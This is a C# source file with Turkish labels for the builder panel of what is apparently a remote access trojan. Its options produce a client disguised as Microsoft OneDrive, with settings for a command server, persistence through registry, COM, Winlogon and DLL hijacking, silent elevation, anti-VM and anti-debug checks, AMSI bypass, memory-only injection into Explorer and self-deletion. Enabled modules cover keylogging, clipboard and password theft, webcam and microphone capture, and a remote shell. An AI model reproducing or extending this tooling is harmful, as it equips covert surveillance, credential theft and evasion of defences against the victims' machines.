// Dosya: Panels/BuilderPanel.cs
using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace App.Service
{
    public class BuilderPanel : BufferedPanel
    {
        public TextBox TxtTag, TxtMutex, TxtAes, TxtHost, TxtPort, TxtFallback, TxtHeart, TxtSocksHost, TxtSocksPort, TxtSocksUser, TxtSocksPass;
        public TextBox TxtInstallPath, TxtProduct, TxtCompany, TxtVersion, TxtLogFolder, TxtOutput, TxtDelay, TxtLockPass, TxtStage0Path;

        public CheckBox ChkAes, ChkUnattended, ChkSocks, ChkInstall, ChkHidden, ChkAntiVm, ChkAntiDebug, ChkElevate, ChkFirewall;
        public CheckBox ChkKeylog, ChkClip, ChkRd, ChkBootstrap, ChkUpx, ChkSign;

        public ComboBox CmbAutostart, CmbPack, CmbNet, CmbMemMode;
        public CheckBox ChkComHijack, ChkWinlogon, ChkTls, ChkJitter, ChkAttach, ChkDll, ChkDllHijack;
        public Label LblStatus, LblMemStatus;
        public PillButton BtnBuild, BtnLoadStage1, BtnSendMem;

        public CheckBox ChkPasswordRecovery, ChkWebcam, ChkAudio, ChkTerminal, ChkScript, ChkFileMgr, ChkRegistry, ChkChat, ChkAdsLog, ChkRecon;
        public CheckBox ChkMemoryOnly, ChkExplorerBind, ChkSelfDelete, ChkAmsiBypass;

        Panel _bar, _host, _bottom;
        Panel[] _pages;
        Button[] _tabs;
        int _idx;

        const int CardW = 470;

        public BuilderPanel()
        {
            BackColor = Theme.Current.Main;

            _bar = new BufferedPanel { Dock = DockStyle.Top, Height = 36, BackColor = Theme.Current.Title };
            _bar.Paint += (s, e) =>
            {
                if (_tabs == null || _idx < 0 || _idx >= _tabs.Length) return;
                var t = _tabs[_idx];
                using (var b = new SolidBrush(Theme.Current.Accent)) e.Graphics.FillRectangle(b, t.Left, _bar.Height - 2, t.Width, 2);
            };

            _host = new BufferedPanel { Dock = DockStyle.Fill, BackColor = Theme.Current.Main, Padding = new Padding(8) };

            _pages = new Panel[6];
            for (int i = 0; i < _pages.Length; i++)
            {
                _pages[i] = new BufferedPanel { Dock = DockStyle.Fill, BackColor = Theme.Current.Main, Visible = false, AutoScroll = true };
                _host.Controls.Add(_pages[i]);
            }

            var t1 = _pages[0];
            var g1 = Grp(t1, "Kimlik ve Şifreleme", 8, 8, CardW, 184);
            TxtTag = Txt(g1, "Client Tag:", 12, 32, "Test" + "Client");
            TxtMutex = Txt(g1, "Process Mutex:", 12, 64, "Glob" + "al\\" + Guid.NewGuid().ToString("N"));
            TxtAes = Txt(g1, "AES-256 Anahtarı:", 12, 96, "C11" + "K_Gizli_Anahtar_2024");
            ChkAes = Chk(g1, "AES-256 + HMAC şifrelemeyi etkinleştir", 12, 128);
            ChkAes.Checked = true;
            ChkUnattended = Chk(g1, "Unattended (sessiz, hiç pencere yok)", 12, 152);

            var t2 = _pages[1];
            var g2 = Grp(t2, "Sunucu", 8, 8, CardW, 232);
            TxtHost = Txt(g2, "Host / Domain:", 12, 32, "127.0.0.1");
            TxtPort = Txt(g2, "Port:", 12, 64, "4444");
            TxtFallback = Txt(g2, "Yedek host:", 12, 96, "");
            TxtHeart = Txt(g2, "Heartbeat (ms):", 12, 128, "60000");
            ChkSocks = Chk(g2, "SOCKS5 proxy kullan", 12, 160);
            TxtSocksHost = Txt(g2, "Proxy host:", 12, 184, "");
            TxtSocksPort = Txt(g2, "Proxy port:", 12, 208, "1080");
            TxtSocksPort.Width = 72;

            var g2b = Grp(t2, "Proxy Kimlik Doğrulama", 8, 248, CardW, 112);
            TxtSocksUser = Txt(g2b, "Kullanıcı:", 12, 32, "");
            TxtSocksUser.Width = 128;
            TxtSocksPass = Txt(g2b, "Şifre:", 12, 64, "");
            TxtSocksPass.Width = 128;

            var t3 = _pages[2];
            var g3 = Grp(t3, "Autostart ve Gizlilik", 8, 8, CardW, 310);
            ChkInstall = Chk(g3, "Sisteme kur (otomatik kopyala)", 12, 32);
            ChkInstall.Checked = true;
            TxtInstallPath = Txt(g3, "Kurulum yolu:", 12, 64, @"%LocalAppData%\Micro" + @"soft\OneDrive");
            ChkHidden = Chk(g3, "Dosyayı gizli işaretle", 12, 96);
            ChkHidden.Checked = true;
            Lbl(g3, "Autostart yöntemi:", 12, 128);
            CmbAutostart = Cmb(g3, new[] { "Yok", "Registry (Run)", "Startup Klasörü", "Task Scheduler", "Görev (Açılışta)", "Windows Servisi" }, 12, 152, 224);
            CmbAutostart.SelectedIndex = 1;
            ChkAntiVm = Chk(g3, "Environment check (VM / sandbox)", 12, 184);
            ChkAntiDebug = Chk(g3, "Hata ayıklayıcı varsa çık", 12, 208);
            ChkFirewall = Chk(g3, "Güvenlik duvarı istisnası ekle", 12, 232);
            ChkComHijack = Chk(g3, "COM Hijacking (MMDeviceEnumerator)", 12, 256);
            ChkComHijack.Checked = true;
            ChkWinlogon = Chk(g3, "Winlogon Helper (DLL modunda)", 12, 280);

            var g3b = Grp(t3, "Yükseltme ve Gecikme", 8, 326, CardW, 104);
            ChkElevate = Chk(g3b, "Başlangıçta sessizce yönetici olarak yükselt", 12, 32);
            ChkElevate.Checked = true;
            TxtDelay = Txt(g3b, "Ek gecikme (ms, 0 = otomatik):", 12, 64, "0");
            TxtDelay.Width = 72;

            var t4 = _pages[3];
            var g4 = Grp(t4, "Dosya Bilgisi ve Paketleme", 8, 8, CardW, 290);
            TxtProduct = Txt(g4, "Ürün adı:", 12, 32, "Windows Sync " + "Service");
            TxtCompany = Txt(g4, "Şirket:", 12, 64, "Micro" + "soft Win" + "dows");
            TxtVersion = Txt(g4, "Dosya sürümü:", 12, 96, "23.1.0.0");
            Lbl(g4, "Encoding:", 12, 128);
            CmbPack = Cmb(g4, new[] { "Yok", "ConfuserEx" }, 12, 152, 152);
            CmbPack.SelectedIndex = 0;
            ChkBootstrap = Chk(g4, "Bootstrap kullan (module bellekte açılır)", 12, 184);
            ChkSign = Chk(g4, "Dijital imza ekle (self-signed)", 12, 208);
            ChkSign.Checked = true;
            ChkUpx = Chk(g4, "UPX ile sıkıştır (upx.exe gerekli)", 12, 232);
            TxtOutput = Txt(g4, "Çıktı dosyası:", 12, 256, "OneDrive.exe");

            var g4b = Grp(t4, "Ağ ve İleri Seviye", 8, 306, CardW, 240);
            Lbl(g4b, "Ağ modu:", 12, 32);
            CmbNet = Cmb(g4b, new[] { "WebSocket", "TLS", "TCP (düz)", "DNS (fallback)" }, 12, 56, 176);
            CmbNet.SelectedIndex = 0;
            ChkTls = Chk(g4b, "WebSocket üzerine TLS sar (SslStream)", 12, 88);
            ChkJitter = Chk(g4b, "Jitter (gönderimde 1-5 sn rastgele gecikme)", 12, 112);
            ChkAttach = Chk(g4b, "Explorer'a attach et (süreç ölmez)", 12, 136);
            ChkDll = Chk(g4b, "DLL olarak derle (/target:library)", 12, 160);
            ChkDllHijack = Chk(g4b, "DLL Search Order Hijacking (version.dll)", 12, 184);
            TxtLockPass = Txt(g4b, "Tam ekran kilit şifresi:", 12, 208, "c11" + "k");
            TxtLockPass.Width = 168;

            var t5 = _pages[4];
            var g5 = Grp(t5, "İzleme ve Loglama", 8, 8, CardW, 168);
            ChkKeylog = Chk(g5, "Input monitor otomatik başlasın", 12, 32);
            ChkClip = Chk(g5, "Pano kaydı otomatik başlasın", 12, 56);
            ChkRd = Chk(g5, "Masaüstü otomatik başlasın", 12, 80);
            ChkRd.Checked = true;
            TxtLogFolder = Txt(g5, "Log alt klasörü (boş = yok):", 12, 112, "");
            TxtLogFolder.Width = 168;

            var g5b = Grp(t5, "Derlenen Modüller", 8, 184, CardW, 292);
            ChkPasswordRecovery = Chk(g5b, "Veri toplama (sunucu scripti)", 12, 32);
            ChkPasswordRecovery.Checked = true;
            ChkWebcam = Chk(g5b, "Webcam karesi", 12, 56);
            ChkWebcam.Checked = true;
            ChkAudio = Chk(g5b, "Ses kaydı (mikrofon)", 12, 80);
            ChkAudio.Checked = true;
            ChkTerminal = Chk(g5b, "Terminal (cmd)", 12, 104);
            ChkTerminal.Checked = true;
            ChkScript = Chk(g5b, "Script (PS / BAT)", 12, 128);
            ChkScript.Checked = true;
            ChkFileMgr = Chk(g5b, "Dosya yöneticisi + parça transferi", 12, 152);
            ChkFileMgr.Checked = true;
            ChkRegistry = Chk(g5b, "Kayıt defteri + başlangıç", 12, 176);
            ChkRegistry.Checked = true;
            ChkChat = Chk(g5b, "Sohbet + toast", 12, 200);
            ChkChat.Checked = true;
            ChkAdsLog = Chk(g5b, "ADS log hattı (LOG|DATA)", 12, 224);
            ChkAdsLog.Checked = true;
            ChkRecon = Chk(g5b, "Keşif (AV / RAM / kamera / monitör)", 12, 248);
            ChkRecon.Checked = true;

            var t6 = _pages[5];
            var g6 = Grp(t6, "Bellek Modu (Stage 0 / Stage 1)", 8, 8, CardW, 240);
            ChkMemoryOnly = Chk(g6, "Sadece bellekte çalış (diske modül yazma)", 12, 32);
            Lbl(g6, "Yükleme modu:", 12, 60);
            CmbMemMode = Cmb(g6, new[] { "Normal bellek (Assembly.Load)", "Explorer sürecine yaz" }, 12, 84, 300);
            ChkExplorerBind = Chk(g6, "Explorer açılışında otomatik başlat (Run + Startup)", 12, 116);
            ChkSelfDelete = Chk(g6, "Yükleme başarılıysa taşıyıcıyı sil", 12, 140);
            ChkSelfDelete.Checked = true;
            ChkAmsiBypass = Chk(g6, "AMSI kapat (PowerShell öncesi)", 12, 164);
            TxtStage0Path = Txt(g6, "Taşıyıcı klasörü:", 12, 192, @"%LocalAppData%\Micro" + @"soft\OneDrive");

            var g6b = Grp(t6, "Sunucu Deposu", 8, 256, CardW, 200);
            BtnLoadStage1 = new PillButton { Text = "Stage 1 (DLL) Yükle", Location = new Point(12, 30), Size = new Size(168, 28), Radius = 6 };
            BtnLoadStage1.Palette(Theme.Current.Accent, Color.White);
            g6b.Controls.Add(BtnLoadStage1);

            BtnSendMem = new PillButton { Text = "Seçili İstemciye Gönder", Location = new Point(12, 64), Size = new Size(200, 28), Radius = 6 };
            BtnSendMem.Palette(Theme.Current.Ok, Color.White);
            g6b.Controls.Add(BtnSendMem);

            LblMemStatus = new Label
            {
                Location = new Point(12, 100),
                Size = new Size(430, 88),
                ForeColor = Theme.Current.Muted,
                BackColor = Color.Transparent,
                Font = new Font("Consolas", 7.5f),
                Text = "Depo: boş"
            };
            g6b.Controls.Add(LblMemStatus);

            string[] names = { "Kimlik", "Bağlantı", "Kurulum", "Derleme", "İzleme", "Bellek" };
            _tabs = new Button[names.Length];
            for (int i = 0; i < names.Length; i++)
            {
                int idx = i;
                var b = new Button
                {
                    Text = names[i],
                    Location = new Point(8 + i * 74, 6),
                    Size = new Size(70, 24),
                    FlatStyle = FlatStyle.Flat,
                    BackColor = Theme.Current.Side,
                    ForeColor = Theme.Current.Text,
                    Font = Ui.F(7.5f),
                    Cursor = Cursors.Hand,
                    TabStop = false,
                    UseVisualStyleBackColor = false
                };
                b.FlatAppearance.BorderSize = 0;
                b.Click += (s, e) => SwitchTab(idx);
                _bar.Controls.Add(b);
                _tabs[i] = b;
            }

            _bottom = new BufferedPanel { Dock = DockStyle.Bottom, Height = 48, BackColor = Theme.Current.Side, Tag = "side" };
            LblStatus = new Label
            {
                Text = "Hazır",
                AutoSize = false,
                Location = new Point(16, 0),
                Height = 48,
                TextAlign = ContentAlignment.MiddleLeft,
                AutoEllipsis = true,
                ForeColor = Theme.Current.Text,
                Font = Ui.F(8.5f)
            };
            BtnBuild = new PillButton
            {
                Text = "Derle",
                Size = new Size(112, 30),
                Location = new Point(16, 9),
                Font = Ui.F(8.5f, FontStyle.Bold),
                Tag = "accent",
                Radius = 7
            };
            BtnBuild.Palette(Theme.Current.Accent, Color.White);

            _bottom.Controls.Add(LblStatus);
            _bottom.Controls.Add(BtnBuild);

            Action layoutBottom = () =>
            {
                int bw = BtnBuild.Width;
                BtnBuild.Left = Math.Max(16, _bottom.Width - bw - 12);
                BtnBuild.Top = Math.Max(4, (_bottom.Height - BtnBuild.Height) / 2);
                LblStatus.Left = 16;
                LblStatus.Top = 0;
                LblStatus.Height = _bottom.Height;
                LblStatus.Width = Math.Max(40, BtnBuild.Left - 24);
            };
            _bottom.Resize += (s, e) => layoutBottom();
            layoutBottom();

            Controls.Add(_host);
            Controls.Add(_bottom);
            Controls.Add(_bar);

            SwitchTab(0);
        }

        void SwitchTab(int idx)
        {
            _idx = idx;
            for (int i = 0; i < _pages.Length; i++) _pages[i].Visible = i == idx;
            for (int i = 0; i < _tabs.Length; i++)
            {
                bool on = i == idx;
                _tabs[i].BackColor = on ? Theme.Current.Accent : Theme.Current.Side;
                _tabs[i].ForeColor = on ? Color.White : Theme.Current.Text;
            }
            _bar.Invalidate();
        }

        DarkGroup Grp(Control p, string text, int x, int y, int w, int h)
        {
            var g = new DarkGroup { Caption = text, Location = new Point(x, y), Size = new Size(w, h), ForeColor = Theme.Current.Accent };
            p.Controls.Add(g);
            return g;
        }

        Label Lbl(Control p, string text, int x, int y)
        {
            var l = new Label { Text = text, Location = new Point(x, y), AutoSize = true, ForeColor = Theme.Current.Text, BackColor = Color.Transparent, Font = Ui.F(8.5f) };
            p.Controls.Add(l);
            return l;
        }

        TextBox Txt(Control p, string label, int x, int y, string value)
        {
            var l = new Label
            {
                Text = label,
                Location = new Point(x, y),
                Width = 116,
                Height = 16,
                AutoSize = false,
                AutoEllipsis = true,
                ForeColor = Theme.Current.Text,
                BackColor = Color.Transparent,
                Font = Ui.F(8.5f)
            };
            p.Controls.Add(l);

            var t = new TextBox { Location = new Point(x + 124, y - 3), Width = 240, Text = value, BackColor = Theme.Current.InputBack, ForeColor = Theme.Current.InputFore, BorderStyle = BorderStyle.FixedSingle, Font = Ui.F(8.5f) };
            p.Controls.Add(t);
            return t;
        }

        CheckBox Chk(Control p, string text, int x, int y)
        {
            var c = new CheckBox { Text = text, Location = new Point(x, y), AutoSize = true, ForeColor = Theme.Current.Text, BackColor = Color.Transparent, Font = Ui.F(8.5f) };
            p.Controls.Add(c);
            return c;
        }

        ComboBox Cmb(Control p, string[] items, int x, int y, int w)
        {
            var c = new ComboBox { Location = new Point(x, y), Width = w, DropDownStyle = ComboBoxStyle.DropDownList, FlatStyle = FlatStyle.Flat, BackColor = Theme.Current.InputBack, ForeColor = Theme.Current.InputFore, Font = Ui.F(8.5f) };
            c.Items.AddRange(items);
            c.SelectedIndex = 0;
            p.Controls.Add(c);
            return c;
        }

        public void ApplyTheme()
        {
            BackColor = Theme.Current.Main;
            _host.BackColor = Theme.Current.Main;

            for (int i = 0; i < _pages.Length; i++) _pages[i].BackColor = Theme.Current.Main;

            DarkForm.Recolor(this);

            _bar.BackColor = Theme.Current.Title;
            _bottom.BackColor = Theme.Current.Side;

            LblStatus.ForeColor = Theme.Current.Text;
            BtnBuild.Palette(Theme.Current.Accent, Color.White);
            BtnLoadStage1.Palette(Theme.Current.Accent, Color.White);
            BtnSendMem.Palette(Theme.Current.Ok, Color.White);
            SwitchTab(_idx);
            Invalidate(true);
        }

        public BuildConfig Collect()
        {
            int port, heart, sport, delay;
            if (!int.TryParse(TxtPort.Text.Trim(), out port) || port < 1 || port > 65535)
                throw new Exception("Port 1-65535 arasında olmalı.");
            if (!int.TryParse(TxtHeart.Text.Trim(), out heart) || heart < 10000)
                throw new Exception("Heartbeat en az 10000 ms olmalı.");
            if (!int.TryParse(TxtSocksPort.Text.Trim(), out sport)) sport = 1080;
            if (!int.TryParse(TxtDelay.Text.Trim(), out delay) || delay < 0) delay = 0;

            string host = TxtHost.Text.Trim();
            if (host.Length == 0) throw new Exception("Host boş olamaz.");

            bool memOnly = ChkMemoryOnly.Checked;

            if (ChkBootstrap.Checked && !memOnly && (ChkDll.Checked || ChkDllHijack.Checked))
                throw new Exception("Bootstrap, DLL çıktısıyla birlikte kullanılamaz.\n'Bootstrap' veya 'DLL' seçeneklerinden birini kapat.");

            string output = TxtOutput.Text.Trim();
            foreach (char ch in Path.GetInvalidFileNameChars()) output = output.Replace(ch, '_');
            if (output.Length == 0) output = "OneDrive.exe";

            if (memOnly)
            {
                output = Path.GetFileNameWithoutExtension(output);
                if (string.IsNullOrEmpty(output)) output = "OneDrive";
                output += ".exe";
            }
            else if (ChkDllHijack.Checked) output = "version.dll";
            else if (ChkDll.Checked)
            {
                if (output.ToLower().EndsWith(".exe")) output = output.Substring(0, output.Length - 4) + ".dll";
                else if (!output.ToLower().EndsWith(".dll")) output += ".dll";
            }
            else if (!output.ToLower().EndsWith(".exe")) output += ".exe";

            return new BuildConfig
            {
                Tag = TxtTag.Text.Trim(),
                Mutex = string.IsNullOrWhiteSpace(TxtMutex.Text) ? "Glob" + "al\\" + Guid.NewGuid().ToString("N") : TxtMutex.Text.Trim(),
                AesKey = TxtAes.Text,
                UseAes = ChkAes.Checked,
                Unattended = ChkUnattended.Checked,
                Host = host,
                Port = port,
                FallbackHost = TxtFallback.Text.Trim(),
                HeartbeatMs = heart,
                UseSocks5 = ChkSocks.Checked,
                SocksHost = TxtSocksHost.Text.Trim(),
                SocksPort = sport,
                SocksUser = TxtSocksUser.Text,
                SocksPass = TxtSocksPass.Text,
                Install = ChkInstall.Checked,
                InstallPath = TxtInstallPath.Text.Trim(),
                HideFile = ChkHidden.Checked,
                Autostart = Convert.ToString(CmbAutostart.SelectedItem) ?? "Yok",
                AntiVm = ChkAntiVm.Checked,
                AntiDebug = ChkAntiDebug.Checked,
                Elevate = ChkElevate.Checked,
                StartDelay = delay,
                FirewallRule = ChkFirewall.Checked,
                Product = TxtProduct.Text.Trim(),
                Company = TxtCompany.Text.Trim(),
                FileVersion = TxtVersion.Text.Trim(),
                Packing = Convert.ToString(CmbPack.SelectedItem) ?? "Yok",
                UseUpx = ChkUpx.Checked,
                UseSign = ChkSign.Checked,
                UseBootstrap = ChkBootstrap.Checked && !memOnly,
                InputMonitor = ChkKeylog.Checked,
                Clipboard = ChkClip.Checked,
                RemoteDesktop = ChkRd.Checked,
                LogFolder = TxtLogFolder.Text.Trim(),
                NetMode = CmbNet.SelectedIndex,
                UseTls = ChkTls.Checked,
                Jitter = ChkJitter.Checked,
                Attach = ChkAttach.Checked,
                UseDll = ChkDll.Checked,
                DllHijack = ChkDllHijack.Checked,
                ComHijack = ChkComHijack.Checked,
                Winlogon = ChkWinlogon.Checked,
                LockPass = string.IsNullOrEmpty(TxtLockPass.Text) ? "c11k" : TxtLockPass.Text,
                OutputName = output,

                PasswordRecovery = ChkPasswordRecovery.Checked,
                Webcam = ChkWebcam.Checked,
                AudioRecord = ChkAudio.Checked,
                EnableTerminal = ChkTerminal.Checked,
                EnableShell = ChkTerminal.Checked,
                EnableScript = ChkScript.Checked,
                EnableFileManager = ChkFileMgr.Checked,
                EnableRegistry = ChkRegistry.Checked,
                EnableChat = ChkChat.Checked,
                EnableAdsLog = ChkAdsLog.Checked,
                EnableRecon = ChkRecon.Checked,
                AmsiBypass = ChkAmsiBypass.Checked,

                MemoryOnly = memOnly,
                LoaderMode = memOnly,
                MemoryMode = CmbMemMode.SelectedIndex,
                ExplorerBind = ChkExplorerBind.Checked,
                SelfDelete = ChkSelfDelete.Checked,
                Stage0Path = TxtStage0Path.Text.Trim(),
                DllPayload = memOnly,
                Stage0File = memOnly
            };
        }
    }
}